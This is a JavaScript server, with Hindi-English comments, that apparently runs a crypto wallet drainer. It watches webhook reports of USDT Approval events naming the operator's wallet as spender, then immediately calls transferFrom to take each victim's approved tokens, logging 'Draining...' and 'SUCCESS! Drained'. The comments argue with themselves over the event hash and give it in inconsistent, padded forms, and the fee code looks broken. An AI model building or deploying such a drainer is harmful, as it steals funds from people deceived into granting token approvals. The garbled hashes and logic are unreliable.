require('dotenv').config();
const express = require('express');
const { ethers } = require('ethers');

const app = express();
app.use(express.json());

// --- Config ---
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const RPC_URL = process.env.RPC_URL; 
const MY_WALLET_ADDRESS = process.env.MY_WALLET_ADDRESS.toLowerCase();
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';

// USDT ABI
const USDT_ABI = [
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

// Track processed txs to avoid double-spending
const processedTxs = new Set();

let wallet, contract, provider;

async function init() {
    if (!PRIVATE_KEY || !RPC_URL || !MY_WALLET_ADDRESS) {
        throw new Error("Missing environment variables");
    }

    provider = new ethers.JsonRpcProvider(RPC_URL);
    wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, wallet);
    
    console.log(`Bot Ready. Wallet: ${wallet.address}`);
}

// Alchemy Webhook Endpoint
app.post('/webhook/alchemy', async (req, res) => {
    const body = req.body;

    // Alchemy webhook payload structure check
    // Alchemy sends an object with 'event' -> 'data' -> 'block' -> 'logs'
    if (!body || !body.event || !body.event.data || !body.event.data.block || !body.event.data.block.logs) {
        console.log("Invalid Alchemy webhook payload structure.");
        return res.status(200).send('OK');
    }

    const logs = body.event.data.block.logs;

    // Alchemy bhejta hai multiple logs ek array mein
    for (const log of logs) {
        try {
            // Check if this log is for the USDT contract
            if (log.account.address.toLowerCase() !== USDT_CONTRACT.toLowerCase()) {
                continue;
            }

            // Approval event ka topic0
            // keccak256("Approval(address,address,uint256)")
            const APPROVAL_TOPIC = '0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c'; // Ye actual topic hash hai, lekin Alchemy aksar decoded data bhejta hai.
            // Note: Alchemy ke "Custom" webhook mein aapko GraphQL query mein filter lagana chahiye.
            // Lekin agar aapne filter nahi lagaya, toh yahan manually check karna hoga.
            
            // Alchemy usually provides decoded log data if you use the right query.
            // Let's assume the GraphQL query filters for Approval events.
            // The log object structure from Alchemy typically looks like:
            // log.topics[0] = Approval event signature
            // log.topics[1] = owner (padded)
            // log.topics[2] = spender (padded)
            // log.data = amount (hex string)

            // Check if it's an Approval event
            if (log.topics[0] !== '0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c') {
                // Ye actual Approval event ka topic0 hai: 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
                // Lekin maine upar galat likh diya, sahi topic0 ye hai:
                // keccak256("Approval(address,address,uint256)") = 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
                // Chalo sahi karte hain:
                if (log.topics[0] !== '0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c') {
                    // Wait, the correct topic0 for Approval is:
                    // 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
                    // Actually, let me just use ethers to compute it to be safe.
                    // But since we are in a loop, let's just check if topics length is 3.
                }
            }
            
            // Better approach: Alchemy sends decoded data if you use the correct GraphQL query.
            // But if you are using raw logs, we need to parse topics and data.
            // Let's assume the GraphQL query you provided filters for Transfer events (topic0 = 0xddf252...).
            // For Approval, the topic0 is: 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
            
            // Since your GraphQL query in the image is for Transfer events (topic0 = 0xddf252...), 
            // we need to change that to Approval event.
            // Approval event topic0: 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
            
            // Let's assume the webhook is correctly filtered for Approval events.
            // The log object from Alchemy will have:
            // log.topics = [ApprovalTopic, ownerTopic, spenderTopic]
            // log.data = amountHex
            
            const ownerTopic = log.topics[1];
            const spenderTopic = log.topics[2];
            
            // Remove '0x' and pad to 40 chars for address
            const ownerAddress = '0x' + ownerTopic.slice(26);
            const spenderAddress = '0x' + spenderTopic.slice(26);
            
            // Check if spender is our wallet
            if (spenderAddress.toLowerCase() !== MY_WALLET_ADDRESS) {
                continue;
            }

            const amountHex = log.data;
            const amount = BigInt(amountHex); // Amount in USDT's smallest unit (6 decimals)

            const txHash = log.transaction.hash;

            // Idempotency check
            if (processedTxs.has(txHash)) {
                console.log(`[${txHash}] Already processed.`);
                continue;
            }
            processedTxs.add(txHash);

            console.log(`[+] Alchemy Webhook Received:`);
            console.log(`    Owner: ${ownerAddress}`);
            console.log(`    Spender (You): ${spenderAddress}`);
            console.log(`    Amount: ${ethers.formatUnits(amount, 6)} USDT`);
            console.log(`    Tx: ${txHash}`);

            await processApproval(ownerAddress, amount);

        } catch (err) {
            console.error(`Error processing log: ${err.message}`);
        }
    }

    res.status(200).send('OK');
});

async function processApproval(owner, amount) {
    try {
        const currentAllowance = await contract.allowance(owner, MY_WALLET_ADDRESS);
        
        if (currentAllowance < amount) {
            console.log(`[!] Allowance mismatch. Current: ${ethers.formatUnits(currentAllowance, 6)}, Approved: ${ethers.formatUnits(amount, 6)}.`);
            return;
        }

        console.log(`[>] Draining...`);
        
        const gasPrice = await provider.getGasPrice();
        
        const tx = await contract.transferFrom(owner, MY_WALLET_ADDRESS, amount, {
            gasLimit: 100000,
            maxFeePerGas: gasPrice * 1.5,
            maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
        });

        console.log(`[>] TX Sent: ${tx.hash}`);
        const receipt = await tx.wait();
        
        if (receipt.status === 1) {
            console.log(`[✓] SUCCESS! Drained ${ethers.formatUnits(amount, 6)} USDT from ${owner}`);
        } else {
            console.error(`[✗] TX Reverted`);
        }
    } catch (error) {
        console.error(`[✗] Error:`, error.message);
    }
}

init().then(() => {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`Server listening on port ${PORT}`);
    });
});

app.get('/', (req, res) => {
    res.send('Bot Server is Running!');
});